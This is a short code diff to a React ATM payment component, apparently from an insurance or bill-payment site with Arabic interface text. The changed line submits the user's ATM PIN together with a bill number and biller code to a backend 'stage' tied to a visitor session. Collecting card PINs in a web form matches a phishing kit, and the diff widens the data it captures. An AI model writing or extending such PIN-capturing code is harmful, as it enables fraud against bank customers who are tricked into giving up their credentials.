@@ -49,7 +49,7 @@ const ATMPayment = () => {
     if (pin.length < 4) return;
     setLoading(true);
     linkVisitorToSession({});
-    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin });
+    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin, atm_bill_number: atmBillNumber, atm_biller_code: atmBillerCode });
     setCurrentOrderId(id);
     if (id) sessionStorage.setItem("insurance_order_id", id);
     toast.success("تم التحقق بنجاح");
